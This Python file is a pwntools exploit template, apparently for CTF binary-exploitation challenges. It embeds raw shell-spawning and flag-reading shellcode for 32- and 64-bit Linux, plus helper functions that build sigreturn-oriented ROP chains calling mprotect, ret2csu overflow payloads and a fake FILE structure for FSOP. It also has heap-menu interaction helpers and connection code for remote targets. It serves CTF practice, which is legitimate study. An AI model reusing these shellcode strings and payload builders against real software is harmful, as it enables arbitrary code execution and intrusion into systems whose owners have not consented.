# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.terminal=['tmux','splitw','-h']
context(arch='amd64', os='linux')
context(arch='i386', os='linux')
local = 1
elf = ELF('./pwn1')
if local:
    p = process('./pwn1')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# sl(fmtstr_pay(start_read_offset,{xxx_got:system_addr}))

one64 = [0x4f2c5,0x4f322,0x10a38c]

# shellcode = asm(shellcraft.sh())
shell32='\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
shell64='\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
orw32="\x68\x61\x67\x00\x00\x68\x2e\x2f\x66\x6c\x89\xe3\xb9\x00\x00\x00\x00\xb8\x05\x00\x00\x00\xcd\x80\x89\xc3\x89\xe1\xba\x00\x01\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\xbb\x01\x00\x00\x00\x89\xe1\xba\x00\x01\x00\x00\xb8\x04\x00\x00\x00\xcd\x80"
orw64="\x49\xb8\x2e\x2f\x66\x6c\x61\x67\x00\x00\x41\x50\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\xc7\xc2\x00\x01\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x48\xc7\xc2\x00\x01\x00\x00\xb8\x01\x00\x00\x00\x0f\x05"
open_32="\x90\x90\x90\x90\x90\x90\x90\x90\x68\x00\x00\x00\x40\x5f\x68\x00\x02\x00\x00\x5e\x6a\x07\x5a\x49\xc7\xc2\x22\x00\x00\x00\x4d\x31\xc9\x4d\x31\xc0\x48\xc7\xc0\x09\x00\x00\x00\x0f\x05\x48\x31\xff\x68\x00\x00\x00\x40\x5e\x48\xc7\xc2\x00\x01\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x6a\x23\x68\x08\x00\x00\x40\x48\xcb\x0a"
readwrite_64="\x66\x6c\x61\x67\x00\x00\x00\x00\xbb\x00\x00\x00\x40\x31\xc9\x31\xd2\xb8\x05\x00\x00\x00\xcd\x80\x89\xc1\xbc\x50\x01\x00\x40\x6a\x33\x68\x28\x00\x00\x40\x48\xcb\x48\x89\xcf\x48\xc7\xc6\x00\x01\x00\x40\x48\xc7\xc2\x50\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc6\x00\x01\x00\x40\x48\xc7\xc2\x50\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90"

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(mallocr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))

def srop_pay(pay_start,libc_base):
	pay=''
	shellcode_addr=(libc_base+libc.sym["__free_hook"])&0xfffffffffff000
	frame = SigreturnFrame()
	new_stack=pay_start + 0xf8
	frame.rax=0
	frame.rdi=0
	frame.rsi=shellcode_addr
	frame.rdx=0x100
	frame.rip=libc_base + 0x00000000000d2975 #syscall_ret
	frame.rsp=new_stack
	pay+=bytes(frame)
	pay+=p64(libc_base + 0x000000000002155f) #pop_rdi_ret
	pay+=p64(shellcode_addr)
	pay+=p64(libc_base + 0x0000000000023e6a) #pop_rsi_ret
	pay+=p64(0x800)
	pay+=p64(libc_base + 0x000000000011c65c) #pop_rdx_rbx_ret
	pay+=p64(7)
	pay+=p64(0) 
	pay+=p64(libc_base + libc.symbols['mprotect'])
	pay+=p64(shellcode_addr)
	return pay

def mid_overflow(bufsize,pppppp_ret,mov_ret,func_got,rdi,rsi,rdx,next_func):
	pay = ''
	pay += 'a'*bufsize
	pay += 'bbbbbbbb'
	pay += p64(pppppp_ret)
	pay += p64(0)
	pay += p64(0)
	pay += p64(1)
	pay += p64(func_got)
	pay += p64(rdx)
	pay += p64(rsi)
	pay += p64(rdi)
	pay += p64(mov_ret)
	pay += p64(0)
	pay += p64(0)
	pay += p64(0)
	pay += p64(0)
	pay += p64(0)
	pay += p64(0)
	pay += p64(0)
	pay += p64(next_func)
	return pay

def fsop(fake_io_list_all,libc_base):
	fake_io=""
	fake_io+=p64(0) #_IO_read_end
	fake_io+=p64(0) #_IO_read_base 
	fake_io+=p64(0) #_IO_write_base
	fake_io+=p64(1) #_IO_write_ptr > _IO_write_base
	fake_io+=p64(0) #_IO_write_end
	fake_io+=p64(0) #_IO_buf_base
	fake_io+=p64(0) #_IO_buf_end
	fake_io+=p64(0)*4
	fake_io+=p64(0)
	fake_io+=p64(0)  #fileno and _flags2
	fake_io+=p64(0)  #_old_offset
	fake_io+=p64(0)
	fake_io+=p64(0)#_lock
	fake_io+=p64(0)
	fake_io+=p64(fake_io_list_all+0xe0)#_codecvt
	fake_io+=p64(fake_io_list_all+0xe0+0x120)#_wide_data
	fake_io+=p64(0)*6
	fake_io+=p64(libc_base+0x3e7da8)#vtable  = _IO_wfile_jumps+72
	shellcode_addr=(libc_base+libc.sym["__free_hook"])&0xfffffffffff000
	frame = SigreturnFrame()
	new_stack=fake_io_list_all+0x210
	frame.rax=0 
	frame.rdi=0 
	frame.rsi=shellcode_addr 
	frame.rdx=0x100  
	frame.rip=libc_base+0x00000000000d2975 #syscall_ret
	frame.rsp=new_stack
	fake_io+=p64(0)+p64(0)
	fake_io+=p64(0)*2
	fake_io+=p64(libc_base + libc.symbols["setcontext"]+53) 
	fake_io+=p64(0)
	fake_io+=bytes(frame)[0x30:]
	fake_io+=p64(0)*4
	fake_io+=p64(0)
	fake_io+=p64(9)
	fake_io+=p64(0)
	fake_io+=p64(libc_base + 0x000000000002155f) #pop_rdi_ret
	fake_io+=p64(shellcode_addr)
	fake_io+=p64(libc_base + 0x0000000000023e6a) #pop_rsi_ret
	fake_io+=p64(0x800)
	fake_io+=p64(libc_base + 0x000000000011c65c) #pop_rdx_rbx_ret
	fake_io+=p64(7)
	fake_io+=p64(0) 
	fake_io+=p64(libc_base + libc.symbols['mprotect'])
	fake_io+=p64(shellcode_addr)      
	return fake_io


def add(size,content):
    ru("> ")
    sl('1')
    ru()
    sl(str(size))
    ru()
    sd(content)
def free(index):
    ru("> ")
    sl('3')
    ru()
    sl(str(index))
def edit(index,content):
    ru("> ")
    sl('2')
    ru()
    sl(str(index))
    ru()
    sd(content)
def show(index):
    ru("> ")
    sl('4')
    ru()
    sl(str(index))







# libc_base = u64(rc(6).ljust(8,'\x00'))
# print "libc_base--->" + hex(libc_base)

# heap = u64(rc(6).ljust(8,'\x00'))
# print "heap--->" + hex(heap)

# onegadget = libc_base + one64[2]
# setcontext = libc_base+libc.sym["setcontext"]
# io_list_all = libc_base+libc.sym["_IO_list_all"]
# malloc_hook = libc_base + libc.sym["__malloc_hook"]
# free_hook = libc_base + libc.sym["__free_hook"]
# realloc = libc_base + libc.sym["realloc"]
# system = libc_base + libc.sym["system"]
# binsh = libc_base + libc.search("/bin/sh\x00").next()
# mprotect = libc_base + libc.symbols['mprotect']
# read = libc_base + libc.sym["read"]
# ret = libc_base + 0x00000000000c926f
# leave_ret = libc_base + 0x0000000000054803
# syscall_ret = libc_base + 0x00000000000d2975
# pop_rdi_ret = libc_base + 0x000000000002155f
# pop_rsi_ret = libc_base + 0x0000000000023e6a
# pop_rdx_ret = libc_base + 0x0000000000001b96
# pop_rdx_rbx_ret = libc_base + 0x000000000011c65c








 

# value = 0x00
# i = 0
# while 1:
#     print i
#     i += 1
#     try:
#         print("value--->"+hex(value))
#         pwn(value)
#     except EOFError:
#         p.close()
#         if local:
#             p = process('./chunk29')
#             value += 1
#         else:
#             p = remote('121.40.246.48',9999)
#             value += 1
#     else:
#         sl("ls")
#         break

p.interactive()
	